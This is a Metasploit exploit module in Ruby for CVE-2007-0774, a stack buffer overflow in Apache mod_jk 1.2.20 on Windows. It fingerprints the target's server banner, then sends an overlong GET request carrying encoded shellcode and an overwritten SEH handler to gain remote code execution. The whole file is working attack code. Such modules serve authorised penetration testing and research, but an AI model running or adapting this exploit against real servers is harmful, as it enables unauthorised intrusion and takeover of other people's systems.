require 'msf/core'

module Msf

class Exploits::Windows::Http::Apache_Mod_JK < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Apache mod_jk 1.2.20 Buffer Overflow',
			'Description'    => %q{
				This is a stack overflow exploit for mod_jk 1.2.20.
				Should work on any Win32 OS.
			},
			'Author'         => 'Nicob <nicob[at]nicob.net>',
			'Version'        => '$Revision: 4961 $',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'BID', '22791'],
					[ 'CVE', 'CVE-2007-0774' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-07-008.html'],

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 4000,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'EncoderType' => Msf::Encoder::Type::AlphanumUpper,
					'MaxNops'  => 0,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					# POP/POP/RET in mod_jk 1.2.20 (Apache 1.3.37, 2.0.58 and 2.2.3)
					['mod_jk 1.2.20 (Apache 1.3.x/2.0.x/2.2.x) (any win32 OS/language)', { 'Ret' => 0x6a6b8ef1 }],
				],
			'DefaultTarget'  => 0))
			
			register_options( [ Opt::RPORT(80) ], self.class )
	end

	def check
		connect

		sock.put("GET / HTTP/1.0\r\n\r\n")
		resp = sock.get_once
		disconnect
			
			if (resp and (m = resp.match(/Server: Apache\/(.*) \(Win32\)(.*) mod_jk\/1.2.20/))) then
				print_status("Apache version detected : #{m[1]}")
				return Exploit::CheckCode::Appears
			else
				return Exploit::CheckCode::Safe
			end
	end

	def exploit
		connect

		uri_start  = "GET /"
		uri_end    = ".html HTTP/1.0\r\n\r\n"
		sc_base    = 16

		shellcode  = payload.encoded
		sploit     = Rex::Text.rand_text_alphanumeric(5001, payload_badchars)
		sploit[sc_base, shellcode.length] = shellcode

		# 16 : Apache/1.3.37 (Win32) mod_jk/1.2.20
		# 20 : Apache/2.0.59 (Win32) mod_jk/1.2.20
		# 21 : Apache/2.2.3  (Win32) mod_jk/1.2.20
	 
		seh_base = 4087
		[ 16, 20, 21 ].each { |x|
			seh_offset = seh_base + (16 * x)
			sploit[seh_offset - 9, 5] = "\xe9" + [sc_base - seh_offset + 4].pack('V')
			sploit[seh_offset - 4, 2] = "\xeb\xf9"
			sploit[seh_offset    , 4] = [ target.ret ].pack('V')
			print_status("Inserting custom SEH at offset #{seh_offset} ...")
		}
		
		print_status("Trying target #{target.name}...")
		sock.put(uri_start + sploit + uri_end)

		resp = sock.get_once
				if (resp and (m = resp.match(/<title>(.*)<\/title>/i)))
			print_status("The exploit failed : HTTP Status Code '#{m[1]}' received :-(")
		end 

		handler
		disconnect
	end

end
end	

